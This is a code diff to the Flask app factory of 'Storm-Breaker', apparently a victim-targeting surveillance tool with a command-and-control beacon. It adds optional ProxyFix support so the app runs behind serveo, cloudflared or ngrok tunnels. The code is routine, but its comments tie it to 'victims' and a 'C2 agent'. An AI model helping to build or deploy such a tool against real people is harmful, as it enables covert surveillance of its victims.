@@ -15,6 +15,7 @@ services / state adapters.
 """
 from __future__ import annotations
 
+import json
 import os
 import secrets as _secrets
 import sys
@@ -63,6 +64,18 @@ def _load_or_create_secret_key() -> str:
     return sk
 
 
+def _trust_proxy() -> bool:
+    """Env STORM_TRUST_PROXY wins; else Settings.json trust_proxy; else True."""
+    env = os.environ.get("STORM_TRUST_PROXY")
+    if env is not None:
+        return env != "0"
+    try:
+        with open(os.path.join(_PARENT, "Settings.json"), encoding="utf-8") as fh:
+            return bool(json.load(fh).get("trust_proxy", True))
+    except Exception:
+        return True
+
+
 def create_app() -> Flask:
     """Instantiate the Storm-Breaker Flask app, identically to app.py 0.X.X.
 
@@ -73,6 +86,19 @@ def create_app() -> Flask:
     app = Flask(__name__, static_folder=STATIC_FOLDER,
                 template_folder=TEMPLATE_FOLDER)
     app.secret_key = _load_or_create_secret_key()
+
+    # P16: trust a reverse proxy (serveo / cloudflared / ngrok).  ProxyFix only
+    # rewrites an environ key when the matching X-Forwarded-* header is present,
+    # so a bare localhost/LAN bind is unaffected.  Without it, request.scheme is
+    # http and request.host_url reports http://<tunnel-host>, so any generated
+    # absolute URL (e.g. the C2 agent base in beacon.py:76) is mixed content on
+    # an https page.  Disable with STORM_TRUST_PROXY=0 or Settings.json
+    # {"trust_proxy": false}.
+    if _trust_proxy():
+        from werkzeug.middleware.proxy_fix import ProxyFix
+        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1,
+                                x_host=1, x_port=1)
+
     # P7.4: upload caps (was app.py's verbatim MAX_CONTENT_LENGTH = None).
     # P7.2: session-cookie hardening + Origin/Referer CSRF gate for
     # operator-authenticated mutating requests (victims exempt).
